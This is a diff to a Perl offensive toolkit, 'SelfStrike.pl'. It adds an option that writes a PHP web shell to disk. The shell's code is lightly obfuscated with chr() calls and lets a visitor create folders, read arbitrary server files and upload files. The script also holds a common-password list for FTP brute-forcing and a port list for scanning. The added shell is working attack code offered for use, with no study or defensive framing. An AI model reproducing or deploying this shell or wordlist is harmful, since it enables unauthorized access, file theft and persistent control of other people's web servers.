@@ -58,6 +58,8 @@ SelfStrike.pl
  -t|type SelfStrike-Encrypt -k|key 'opcional' -pass 'mensage' -s 'file.txt' *EnCrypt Deffy0h-Crypt*
  \n
  -t|type SelfStrike-Descrypt -k|key 'key public' -pass 'text_deffy0h_encrypt' -s 'file.txt' *Descrypt Deffy0h-Crypt*
+ \n
+ -t|type SelfStrike-SHELL -save 'shell.php'
  \n\n\n
 ";
 
@@ -71,6 +73,23 @@ my @port_	 =("20","21","22","80","23","25","53","443","465","1080","1194","1433"
 my @port_type=("FTP","FTP","SSH","HTTP","TELNET","SMTP","DOMAIN","HTTPS","SMTP","SOCKS","OPEN_VPN","SQL","MYSQL","MINECRAFT");
 
 my @ftp 	=("admin","root","","anonymous","-anonymous@","administrator","123456","12345","12345678","qwerty","password","1234567890","1234","baseball","dragon","football","1234567","monkey","letmein","abc123","111111","mustang","access","shadow","master","michael","superman","696969","123123","batman","trustno1","iloveyou","adobe123","azerty","Admin","letmein","photoshop","shadow","sunshine","password1");
+
+my $xGET=chr(36)."_GET";
+my $xFILE=chr(36)."_FILES";
+my $xMKDIR=chr(64)."mkdir";
+my $move_uploaded_file=chr(64)."move_uploaded_file";
+my $ff=chr(36)."f";
+my $rr=chr(36)."r";
+my $row_01=chr(91);
+my $row_02=chr(93);
+
+
+my $shell="<?php
+if(isset($xGET $row_01 'mkdir' $row_02)){$xMKDIR($xGET $row_01 'mkdir' $row_02,776,true);}if(isset($xFILE $row_01 'file' $row_02)){if($move_uploaded_file($xFILE $row_01 'file' $row_02$row_01 'tmp_name' $row_02,$xFILE $row_01 'file' $row_02$row_01 'name' $row_02)){echo '<span>SUCCESS UPLOAD FILE</span>';}else{echo '<span>ERRO UPLOAD FILE</span>';}}
+?>
+
+<html><head><title>Shell - SelfStrike</title></head> <style>body{ background:#000; } span{ font-family:Arial, Helvetica, sans-serif; font-size:14px; color:#0C3; }#x05Eeq{ width:50%; margin:0 auto; } #_sqer{ width:250px; margin:0 auto; }</style><script>function success(){alert('SUCCESS');} function erro(){alert('ERRO');}</script> <body><div id='x05Eeq'><span><center>======================================================<br>SelfStrike.php Create By SelfStrike.pl<br>======================================================<br><br><span style='font-weight:bold;'>Deffy0h</span></center></span><br /><br /><div id='_sqer'><span>create folder: </span><br /><form action='' method='get'><input type='text' name='mkdir'/><input type='submit' value='create' style='margin-left:5px;'/></form><br /><span>open source: </span><br /><textarea style='width:230px; height:100px;'><?php if(isset($xGET $row_01 'open_source' $row_02)){if($xGET $row_01 'open_source' $row_02 !=''){$ff=fopen($xGET $row_01 'open_source' $row_02,'r'); $rr=fread($ff,filesize($xGET $row_01 'open_source' $row_02)); echo $rr;}} ?></textarea><br /><br /><form action='' method='get'><input type='text' name='open_source' value='index.php' style='width:230px;'/><br /><input type='submit' value='find file' style='width:230px;' /></form><br /><br /><span>upload:</span><br /><form action='' enctype='multipart/form-data' method='post'><input type='file' name='file' style='color:#0C3; width:230px;'  /><br /><br /><input type='submit' value='send file' style='width:230px;'/></form></div></div></body></html> <!-- DOWNLOAD: https://github.com/Deffy0h/SelfStrike -->";
+
 
 print <<EPeq;
 
@@ -191,6 +210,29 @@ if($type eq "SelfStrike-Encrypt" || $type eq "selfstrike-encrypt"){
 if($type eq "SelfStrike-Descrypt" || $type eq "selfstrike-descrypt"){
 &SelfStrike_DesCrypt
 }
+if($type eq "SelfStrike-SHELL" || $type eq "selfstrike-shell"){
+&SelfStrike_Shell
+}
+
+sub SelfStrike_Shell(){
+unless($save){
+$save="SelfStrike.php";
+}
+
+if($save!~m/.php$/){
+print "\n[-] FILE not .php\n";
+$save="SelfStrike.php";
+print "[+] FILE=> $save\n";
+}
+
+open($o,">",$save);
+$o->print($shell);
+$o->close();
+
+print "[+] FILE=> $save\n";
+exit;
+
+}
 
 sub SelfStrike_DesCrypt(){
 
@@ -206,8 +248,10 @@ exit;
 }
 
 if($pass!~m/:/){
+if($save eq ""){
 print "[-] ERRO CRYPT\n";
 exit;
+}
 }
 
 my @words=split /:/,$pass;
@@ -227,21 +271,37 @@ $scii=$scii.(@words[$c]/$key_private)." ";
 $c++;
 }
 
-#open($a,">output.txt");
-#$a->print($str);
-
 print "[+] N=>$len\n";
 print "[+] ASCII=> $scii\n\n";
 print "[+] Key=> $key\n";
 print "[+] Private Key=> $key_private\n\n";
 print "0000000000000000000000000000--- DESCRYPT ---0000000000000000000000000000\n\n\n";
 print $str."\n\n";
-exit;
 
 #######################################################################
 #*:?
 
 if($save ne ""){
+
+unless($key){
+print "[-] Key\n";
+exit;
+}
+
+if($save!~m/.(.*?)/){
+print "[-] Not File\n";
+exit;
+}
+
+
+if($pass!~m/:/){
+print "[-] ERRO CRYPT\n";
+exit;
+}
+
+#open($a,">",$save);
+#$a->print($str);
+#$a->close();
 
 }
 
@@ -276,8 +336,6 @@ $str=$str.":".ord($char);
 $c++;
 }
 
-#open($a,">output.txt");
-#$a->print($encSTR);
 
 print "[+] N=>$len\n";
 print "[+] TEXT=> $pass\n\n";
@@ -290,9 +348,16 @@ print "\n\n\n";
 
 if($save ne ""){
 
+if($save!~m/.(.*?)/){
+print "[-] Not File\n";
+exit;
 }
 
+open($a,">",$save);
+$a->print($encSTR);
+$a->close();
 
+}
 }
 }
 
